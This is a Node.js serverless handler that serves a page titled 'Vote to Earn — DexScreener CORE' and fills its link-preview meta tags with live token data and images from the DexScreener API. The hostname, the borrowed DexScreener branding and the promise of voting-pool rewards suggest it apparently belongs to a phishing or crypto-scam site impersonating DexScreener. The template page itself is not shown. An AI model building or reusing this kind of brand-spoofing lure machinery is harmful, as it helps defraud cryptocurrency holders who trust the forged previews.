const https = require('https');

// ── HTTPS GET helper (works on ALL Node versions) ──
function httpsGet(url) {
    return new Promise((resolve, reject) => {
        const req = https.get(url, (response) => {
            // Follow redirects
            if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
                return httpsGet(response.headers.location).then(resolve).catch(reject);
            }

            let data = '';
            response.on('data', (chunk) => { data += chunk; });
            response.on('end', () => {
                resolve({ status: response.statusCode, body: data });
            });
        });

        req.on('error', (err) => reject(err));
        req.setTimeout(6000, () => {
            req.destroy();
            reject(new Error('Request timeout'));
        });
    });
}

// ── Escape HTML ──
function esc(s) {
    return String(s || '')
        .replace(/&/g, '&amp;')
        .replace(/"/g, '&quot;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

// ── Format market cap ──
function formatMcap(n) {
    if (!n || n === 0) return '$0';
    if (n >= 1e9) return '$' + (n / 1e9).toFixed(1) + 'B';
    if (n >= 1e6) return '$' + (n / 1e6).toFixed(1) + 'M';
    if (n >= 1e3) return '$' + (n / 1e3).toFixed(1) + 'K';
    return '$' + Math.round(n);
}

// ── Chain reward tokens ──
const CHAIN_REWARDS = {
    solana: 'SOL', ethereum: 'ETH', bsc: 'BNB', polygon: 'MATIC',
    arbitrum: 'ETH', avalanche: 'AVAX', base: 'ETH', optimism: 'ETH',
    fantom: 'FTM', cronos: 'CRO', sui: 'SUI', ton: 'TON',
    mantle: 'MNT', linea: 'ETH', blast: 'ETH', scroll: 'ETH',
    zksync: 'ETH', sei: 'SEI', near: 'NEAR', aptos: 'APT'
};

// ── Main handler ──
module.exports = async function handler(req, res) {
    try {
        const ca = req.query.ca || req.query.token || '';
        const host = req.headers.host || 'dexscreener-vote-nine.vercel.app';
        const pageUrl = `https://${host}/?ca=${encodeURIComponent(ca)}`;

        // ── Step 1: Fetch the HTML template ──
        let html = '';
        try {
            const templateResult = await httpsGet(`https://${host}/page.html`);

            if (templateResult.status !== 200) {
                throw new Error('Template returned status ' + templateResult.status);
            }

            html = templateResult.body;
        } catch (templateErr) {
            console.error('Template fetch failed:', templateErr.message);

            // Fallback: serve a redirect to page.html
            res.setHeader('Location', `/page.html${ca ? '?ca=' + encodeURIComponent(ca) : ''}`);
            return res.status(302).send('Redirecting...');
        }

        // ── Step 2: If no CA, serve page as-is ──
        if (!ca || ca.length < 10) {
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            return res.status(200).send(html);
        }

        // ── Step 3: Fetch token data from DexScreener ──
        let ogTitle = 'Vote to Earn — DexScreener CORE';
        let ogDesc = '🗳 Vote and earn rewards from the community voting pool';
        let ogImage = 'https://dexscreener.com/og.png';

        try {
            const apiUrl = `https://api.dexscreener.com/latest/dex/tokens/${encodeURIComponent(ca)}`;
            const apiResult = await httpsGet(apiUrl);

            if (apiResult.status === 200) {
                const data = JSON.parse(apiResult.body);

                if (data.pairs && data.pairs.length > 0) {
                    // Pick best pair by liquidity
                    const pair = data.pairs.sort(
                        (a, b) => ((b.liquidity && b.liquidity.usd) || 0) - ((a.liquidity && a.liquidity.usd) || 0)
                    )[0];

                    const token = pair.baseToken || {};
                    const chain = pair.chainId || 'unknown';
                    const mcap = pair.fdv || pair.marketCap || 0;
                    const chainSym = CHAIN_REWARDS[chain] || chain.toUpperCase();

                    const name = token.name || token.symbol || 'Token';
                    const symbol = token.symbol || token.name || '???';
                    const mcapStr = formatMcap(mcap);

                    // Image
                    if (pair.info && pair.info.imageUrl) {
                        ogImage = pair.info.imageUrl;
                    } else {
                        ogImage = 'https://dd.dexscreener.com/ds-data/tokens/' + chain + '/' + ca + '.png';
                    }

                    ogTitle = name + ' — Vote to Earn ' + chainSym;
                    ogDesc = '🗳 Vote for ' + symbol + ' · ' + mcapStr + ' mcap · Earn ' + chainSym + ' rewards from the community voting pool';
                }
            }
        } catch (apiErr) {
            console.error('DexScreener API error:', apiErr.message);
            // Continue with default OG tags
        }

        // ── Step 4: Replace meta tags in HTML ──
        var safeTitle = esc(ogTitle);
        var safeDesc = esc(ogDesc);
        var safeImage = esc(ogImage);
        var safeUrl = esc(pageUrl);

        html = html
            .replace(/<title>[^<]*<\/title>/, '<title>' + safeTitle + '</title>')
            .replace(
                /<meta property="og:title" content="[^"]*"/,
                '<meta property="og:title" content="' + safeTitle + '"'
            )
            .replace(
                /<meta property="og:description" content="[^"]*"/,
                '<meta property="og:description" content="' + safeDesc + '"'
            )
            .replace(
                /<meta property="og:image" content="[^"]*"/,
                '<meta property="og:image" content="' + safeImage + '"'
            )
            .replace(
                /<meta property="og:url" content="[^"]*"/,
                '<meta property="og:url" content="' + safeUrl + '"'
            )
            .replace(
                /<meta name="twitter:title" content="[^"]*"/,
                '<meta name="twitter:title" content="' + safeTitle + '"'
            )
            .replace(
                /<meta name="twitter:description" content="[^"]*"/,
                '<meta name="twitter:description" content="' + safeDesc + '"'
            )
            .replace(
                /<meta name="twitter:image" content="[^"]*"/,
                '<meta name="twitter:image" content="' + safeImage + '"'
            )
            .replace(
                /<link rel="icon" type="image\/png" href="[^"]*"/,
                '<link rel="icon" type="image/png" href="' + safeImage + '"'
            );

        // Add description meta if missing
        if (html.indexOf('name="description"') === -1) {
            html = html.replace(
                '</head>',
                '<meta name="description" content="' + safeDesc + '">\n</head>'
            );
        }

        // ── Step 5: Send ──
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.setHeader('Cache-Control', 'public, s-maxage=120, max-age=60, stale-while-revalidate=300');
        return res.status(200).send(html);

    } catch (err) {
        // ── Global error fallback ──
        console.error('Handler error:', err.message, err.stack);

        var fallbackCA = (req.query && req.query.ca) || '';
        res.setHeader('Location', '/page.html' + (fallbackCA ? '?ca=' + encodeURIComponent(fallbackCA) : ''));
        return res.status(302).send('Redirecting...');
    }
};
